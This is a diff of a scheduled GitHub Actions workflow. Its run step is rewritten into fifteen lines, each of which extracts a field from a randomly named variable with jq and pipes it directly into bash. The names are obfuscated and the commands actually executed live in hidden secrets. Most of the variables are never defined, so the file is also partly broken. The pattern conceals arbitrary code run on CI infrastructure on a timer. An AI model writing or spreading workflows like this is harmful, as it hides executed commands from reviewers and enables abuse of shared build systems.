@@ -2,21 +2,29 @@ name: fenxiagn
 on:
   workflow_dispatch:
   schedule:
-    - cron: '11 1/6 * * *'
-jobs:  # 30699
+    - cron: '25 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: fenxiagn
         env:
-          li51807: ${{ secrets.li51807 }}
+          m23187: ${{ secrets.m23187 }}
         run: |
-          echo $li51807 | jq -r .t28 | /bin/bash
-          echo $fp8 | jq -r .b3202 | /bin/bash
-          echo $tyq8693 | jq -r .i8634 | /bin/bash
-          echo $x74967 | jq -r .cao428 | /bin/bash
-          echo $jven37938 | jq -r .yhoji2851 | /bin/bash
-          echo $wahx775 | jq -r .mliym100 | /bin/bash
-          echo $wwbkj90 | jq -r .fv885 | /bin/bash
+          echo $m23187 | jq -r .znn6 | /bin/bash
+          echo $dkq3359 | jq -r .w69 | /bin/bash
+          echo $xvizp659 | jq -r .jhqse5 | /bin/bash
+          echo $xwpu426 | jq -r .ftm442 | /bin/bash
+          echo $g09051 | jq -r .tkc82 | /bin/bash
+          echo $njt62 | jq -r .ib79 | /bin/bash
+          echo $phcol9 | jq -r .adxcg9 | /bin/bash
+          echo $x262 | jq -r .jat2093 | /bin/bash
+          echo $zpj81511 | jq -r .ty284 | /bin/bash
+          echo $fymm64203 | jq -r .nftil466 | /bin/bash
+          echo $gqpy69 | jq -r .yw7 | /bin/bash
+          echo $m32807 | jq -r .ibmm24006 | /bin/bash
+          echo $gxcu5069 | jq -r .s65821 | /bin/bash
+          echo $pufo52551 | jq -r .izno31031 | /bin/bash
+          echo $kcf1121 | jq -r .i8397 | /bin/bash
 
